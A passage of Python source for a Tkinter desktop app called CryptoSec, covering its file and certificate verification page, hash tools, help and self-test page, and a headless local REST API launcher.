        col = {"ok": GREEN, "bad": RED, "unknown": GOLD}[level]
        self.chk_head.configure(text={"ok": "✔  ", "bad": "✖  ", "unknown": "⚠  "}[level] + head, fg=col)
        self.chk_detail.configure(text="\n".join(t for s, t in lines if s != "info")[:420])
        self.chk_import.set_enabled(level == "unknown")

    # ═════════════════════════════════════════════════════════════════
    #  VERIFY PAGE
    # ═════════════════════════════════════════════════════════════════
    def _build_verify(self):
        left, right = self._split_page(
            "verify", "Verify authenticity",
            "Is this file — or this certificate — genuine?  Check the signature, the ledger record and the fingerprint.")
        c1 = Card(left, "A  ·  CHECK A FILE AGAINST YOUR LEDGER")
        c1.pack(fill="x")
        self.ver_file_drop = self._drop_zone(c1.body, self.ver_pick_file, self.ver_load_file,
                                             "⬇   Drop ANY file here   or   click to choose")
        self.ver_file_drop.pack(fill="x")
        self.ver_file_lbl = tk.Label(c1.body, text="Works for files you created — and for files other people sent you.",
                                     font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.ver_file_lbl.pack(fill="x", pady=(6, 0))
        autowrap(self.ver_file_lbl)
        c2 = Card(left, "B  ·  CHECK A PROOF CERTIFICATE  (.csproof)")
        c2.pack(fill="x", pady=10)
        self.ver_cert_drop = self._drop_zone(c2.body, self.ver_pick_cert, self.ver_load_cert,
                                             "⬇   Drop a certificate here   or   click to choose")
        self.ver_cert_drop.pack(fill="x")
        self.ver_cert_lbl = tk.Label(c2.body, text="Add the matching file too, to prove it was not altered.",
                                     font=FONT_S, fg=MUTED, bg=CARD, anchor="w", justify="left")
        self.ver_cert_lbl.pack(fill="x", pady=(6, 0))
        autowrap(self.ver_cert_lbl)
        FlatButton(left, "Clear both", self.ver_clear, bg=CARD2, fg=TEXT, font=FONT_SB, pady=8).pack(anchor="w")
        vc = Card(right, "VERDICT")
        vc.pack(fill="both", expand=True)
        self.ver_verdict = tk.Label(vc.body, text="Nothing checked yet", font=("Segoe UI", 16, "bold"),
                                    fg=MUTED, bg=CARD, anchor="w")
        self.ver_verdict.pack(fill="x")
        self.ver_list = ResultList(vc.body, height=16)
        self.ver_list.pack(fill="both", expand=True, pady=(8, 0))
        self.render_verify()

    def ver_pick_file(self):
        p = filedialog.askopenfilename(title="Choose the file to check")
        if p:
            self.ver_load_file(p)

    def ver_pick_cert(self):
        p = filedialog.askopenfilename(title="Choose a proof certificate",
                                       filetypes=[("Proof certificate", "*.csproof *.json"), ("All files", "*.*")])
        if p:
            self.ver_load_cert(p)

    def ver_load_file(self, path: str):
        if self.busy:
            return
        if path.lower().endswith(".csproof"):
            return self.ver_load_cert(path)
        if not os.path.isfile(path):
            self.problem("That is not a file.")
            return

        def done(sha):
            self.ver_sha = sha
            self.ver_ai = None
            if self.hub:
                self._ai_file_check(path, "Verify")
            self.ver_file_drop.label.configure(text="📄  " + os.path.basename(path), fg=TEXT)
            self.ver_file_lbl.configure(text=f"SHA-256  {sha}", fg=ACCENT, font=FONT_MS)
            self.render_verify()

        self.run_task("Fingerprinting file…", lambda rep: file_sha256(path, lambda d, t: rep(d, t, "Fingerprinting file…")), done)

    def ver_load_cert(self, path: str):
        try:
            if os.path.getsize(path) > (5 << 20):
                raise ValueError("file is too large")
            with open(path, encoding="utf-8") as f:
                obj = json.load(f)
        except Exception as e:
            self.problem(f"This is not a readable proof certificate.\n\n{e}", kind="err")
            return
        self.ver_cert = obj
        self.ver_cert_drop.label.configure(text="📜  " + os.path.basename(path), fg=TEXT)
        self.ver_cert_lbl.configure(text="Certificate loaded.", fg=ACCENT)
        self.render_verify()

    def ver_clear(self):
        self.ver_sha = self.ver_cert = None
        self.ver_file_drop.label.configure(text="⬇   Drop ANY file here   or   click to choose", fg=ACCENT)
        self.ver_cert_drop.label.configure(text="⬇   Drop a certificate here   or   click to choose", fg=ACCENT)
        self.ver_file_lbl.configure(text="Works for files you created — and for files other people sent you.",
                                    fg=MUTED, font=FONT_S)
        self.ver_cert_lbl.configure(text="Add the matching file too, to prove it was not altered.", fg=MUTED)
        self.render_verify()

    def render_verify(self):
        if not hasattr(self, "ver_list"):
            return
        lines: list = []
        if self.ver_cert is not None:
            lines.append(("head", "PROOF CERTIFICATE" + ("  +  FILE" if self.ver_sha else "")))
            lines += verify_certificate(self.ver_cert, self.ledger, self.ver_sha, self.identity.id)
        elif self.ver_sha:
            level, head, found = inspect_file(self.ledger, self.ver_sha, self.identity.id)
            lines.append(("head", "FILE  vs.  YOUR LEDGER"))
            lines += found
            if self.hub:
                lines += self._ai_verify_lines()
        st = {s for s, _ in lines}
        if not lines:
            text, col = "Nothing checked yet", MUTED
        elif "fail" in st:
            text, col = "✖  NOT VERIFIED", RED
        elif "warn" in st:
            text, col = "⚠  INCONCLUSIVE", GOLD
        else:
            text, col = "✔  AUTHENTIC", GREEN
        self.ver_verdict.configure(text=text, fg=col)
        self.ver_list.show(lines, "Drop a file, a proof certificate — or both — on the left.")

    def _setting_changed(self, key: str, var):
        self.settings[key] = bool(var.get())
        if hasattr(self, "chain_lbl"):
            self.refresh_chain_chip()

    # ── HASH PAGE ───────────────────────────────────────────────────────
    def _build_hash(self):
        page = tk.Frame(self.content, bg=BG)
        self.pages["hash"] = page
        tk.Label(page, text="Hash tools", font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w", padx=18, pady=(14, 0))
        tk.Label(page, text="Type text (or pick a file) to get its fingerprint. Handy to check a file was not changed.",
                 font=FONT, fg=MUTED, bg=BG).pack(anchor="w", padx=18)
        c = Card(page, "LIVE DIGESTS")
        c.pack(fill="x", padx=16, pady=14)
        self.hash_in = make_text(c.body, height=5)
        self.hash_in.pack(fill="x")
        self.hash_in.bind("<<Modified>>", self._hash_modified)
        self.hash_vars: dict[str, tk.StringVar] = {}
        for name, algo in (("MD5", "md5"), ("SHA-1", "sha1"), ("SHA-256", "sha256"), ("SHA-512", "sha512")):
            row = tk.Frame(c.body, bg=CARD)
            row.pack(fill="x", pady=3)
            tk.Label(row, text=name, font=FONT_SB, fg=ACCENT, bg=CARD, width=9, anchor="w").pack(side="left")
            v = tk.StringVar(value="—")
            self.hash_vars[algo] = v
            make_entry(row, textvariable=v, state="readonly", font=FONT_MS).pack(side="left", fill="x", expand=True, ipady=4)
            FlatButton(row, "Copy", lambda v=v: (self.root.clipboard_clear(), self.root.clipboard_append(v.get()),
                                                 self.toast("Copied.", "info")),
                       bg=CARD2, fg=TEXT, font=FONT_SB, padx=10, pady=4).pack(side="left", padx=(6, 0))
        FlatButton(c.body, "Hash a file…", self._hash_file, bg=TEAL, pady=8).pack(anchor="w", pady=(12, 0))

    def _hash_modified(self, _e=None):
        if self.hash_in.edit_modified():
            data = self.hash_in.get("1.0", "end-1c").encode()
            for algo, v in self.hash_vars.items():
                v.set(hashlib.new(algo, data).hexdigest() if data else "—")
            self.hash_in.edit_modified(False)

    def _hash_file(self):
        p = filedialog.askopenfilename()
        if not p or self.busy:
            return
        size = max(1, os.path.getsize(p))

        def work(rep):
            hs = {a: hashlib.new(a) for a in self.hash_vars}
            done_b = 0
            with open(p, "rb") as f:
                while chunk := f.read(4 << 20):
                    for h in hs.values():
                        h.update(chunk)
                    done_b += len(chunk)
                    rep(done_b, size, "Hashing file…")
            return {a: h.hexdigest() for a, h in hs.items()}

        def done(res):
            for a, d in res.items():
                self.hash_vars[a].set(d)
            self.toast(f"Hashed {os.path.basename(p)}", "ok")

        self.run_task("Hashing file…", work, done)

    # ── HELP PAGE ───────────────────────────────────────────────────────
    def _build_help(self):
        sf = ScrollFrame(self.content)
        self.pages["help"] = sf
        page = sf.inner
        tk.Label(page, text="Help & self-test", font=FONT_H, fg=TEXT, bg=BG).pack(anchor="w", padx=18, pady=(14, 0))

        c = Card(page, "QUICK START")
        c.pack(fill="x", padx=16, pady=(10, 0))
        txt = ("TO HIDE A MESSAGE\n"
               "  1. Open “Hide a message”, choose a PNG picture (or a video).\n"
               "  2. Type your message and a passphrase (twice).\n"
               "  3. Click HIDE MY MESSAGE. A new file named steg_encoded_… is created next to the original.\n\n"
               "TO READ IT\n"
               "  1. Open “Reveal a message” and choose that steg_encoded_… file.\n"
               "  2. Enter the same passphrase and click REVEAL THE MESSAGE.\n\n"
               "GOOD TO KNOW\n"
               "  •  Forgotten passphrases cannot be recovered.\n"
               "  •  Send the result as a FILE / DOCUMENT — chat apps compress normal photos/videos and destroy the message.\n"
               "  •  Result pictures are PNG; result videos are saved uncompressed (big) so nothing is lost.\n"
               "  •  Not sure which method to use? Leave it on AES-256.")
        tk.Label(c.body, text=txt, font=FONT, fg=TEXT, bg=CARD, justify="left", anchor="w").pack(fill="x")

        cb = Card(page, "BLOCKCHAIN IN 60 SECONDS")
        cb.pack(fill="x", padx=16, pady=(10, 0))
        tk.Label(cb.body, justify="left", anchor="w", font=FONT, fg=TEXT, bg=CARD, text=(
            "WHEN YOU HIDE A MESSAGE\n"
            "  CryptoSec signs a record (fingerprints only) and seals it into a block of your personal blockchain.\n\n"
            "TO PROVE A FILE IS GENUINE\n"
            "  Blockchain ledger → click the record → “Save proof certificate”. Send the .csproof (or the printable\n"
            "  .html) together with the file. The other person opens Verify, drops both, and sees ✔ AUTHENTIC —\n"
            "  offline, no account, no server.\n\n"
            "WHEN SOMEONE SENDS YOU A FILE\n"
            "  Ask for their certificate or ledger and use Blockchain → Merge. The Reveal page then shows a green\n"
            "  trust badge: who registered it, when, and that nothing was altered.\n\n"
            "TO LOCK YOUR HISTORY IN\n"
            "  Blockchain → Copy checkpoint, then keep that one line somewhere public (email, post, print).")
        ).pack(fill="x")

        c2 = Card(page, "SYSTEM CHECK")
        c2.pack(fill="x", padx=16, pady=10)
        row = tk.Frame(c2.body, bg=CARD)
        row.pack(fill="x")
        FlatButton(row, "▶  Run self-test", self.run_selftest, bg=GREEN, pady=8).pack(side="left", padx=(0, 8))
        FlatButton(row, "Install video helper", self.install_helper, bg=CARD2, fg=TEXT, pady=8).pack(side="left")
        self.test_out = tk.Text(c2.body, height=11, bg=INPUT, fg=TEXT, font=FONT_MS, relief="flat",
                                state="disabled", wrap="word", padx=10, pady=8)
        self.test_out.pack(fill="x", pady=(10, 0))
        self.test_out.tag_configure("ok", foreground=GREEN)
        self.test_out.tag_configure("err", foreground=RED)
        self.test_out.tag_configure("info", foreground=MUTED)
        self._test_write([("info", f"Python {sys.version.split()[0]}  ·  OpenCV {cv2.__version__}  ·  "
                                   "press “Run self-test” to check everything.\n")])

    def _test_write(self, parts, clear=True):
        self.test_out.configure(state="normal")
        if clear:
            self.test_out.delete("1.0", "end")
        for tag, t in parts:
            self.test_out.insert("end", t, tag)
        self.test_out.configure(state="disabled")

    def run_selftest(self):
        def done(lines):
            parts = [("ok" if ok else "err", f"{'✔' if ok else '✖'}  {t}\n") for ok, t in lines]
            core_bad = [t for ok, t in lines if not ok and not t.startswith(("Video helper", "Drag"))]
            parts.append(("ok" if not core_bad else "err",
                          "\nEverything essential works — you are good to go!" if not core_bad else
                          "\nSomething essential failed. Please copy this report when asking for help."))
            self._test_write(parts)
            self.toast("Self-test finished.", "ok" if not core_bad else "err")
        self.show_page("help")
        self.run_task("Running self-test…", run_self_test, done)

    def install_helper(self):
        def work(rep):
            rep(0, 0, "Installing the video helper (needs internet, ~30 s)…")
            flags = 0x08000000 if os.name == "nt" else 0
            r = subprocess.run([sys.executable, "-m", "pip", "install", "imageio-ffmpeg"],
                               capture_output=True, text=True, creationflags=flags)
            return r.returncode, (r.stdout + r.stderr)[-500:]

        def done(res):
            import importlib
            importlib.invalidate_caches()
            self.refresh_engine()
            if _find_ffmpeg():
                self.toast("Video helper installed — sound will now be kept.", "ok")
            else:
                self.problem("The video helper could not be installed automatically.\n\n"
                             "Open a terminal and run:\n    pip install imageio-ffmpeg\n\n"
                             f"Details:\n{res[1]}", "Install failed")

        self.run_task("Installing video helper…", work, done)


# ═══════════════════════════════════════════════════════════════════════
def run_headless_api(port=None):
    """`python cryptosec_v6.py --api` — the REST API + real-time engine without any window."""
    if csai is None:
        sys.exit("cryptosec_ai.py must be in the same folder as this file.")
    home = data_dir()
    settings = Settings(os.path.join(home, "settings.json"))
    ident = Identity.load_or_create(home, settings["alias"])
    ledger = Ledger(os.path.join(home, "ledger.jsonl"))
    hub = csai.AIHub(home, actor=ident.alias)
    flow = SecureFlow(ident, ledger, settings, hub)
    api = csai.ApiServer(hub, flow.api_ops())
    if hub.pg is not None:
        flow.mirror(True)
        print(f"PostgreSQL        →  {hub.pg.mode} ({hub.pg.status().get('version', '')})")
    elif hub.pg_error:
        print(f"PostgreSQL        →  NOT connected: {hub.pg_error}")
    p = api.start("127.0.0.1", int(port or hub.setting("api_port")))
    print(f"CryptoSec AI API  →  http://127.0.0.1:{p}/api/v1/docs\nAPI key           →  {hub.api_key}\n(Ctrl+C to stop)")
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        api.stop()
        hub.shutdown()


def main():
    if "--api" in sys.argv:
        port = None
        if "--port" in sys.argv:
            port = sys.argv[sys.argv.index("--port") + 1]
        return run_headless_api(port)
    root = TkinterDnD.Tk() if _DND else tk.Tk()
    if csai is None:
        messagebox.showwarning("AI engine missing", "cryptosec_ai.py was not found next to this file, so the AI Security Center is disabled.\n"
                               "All v5 features still work.", parent=root)
    CryptoSecApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
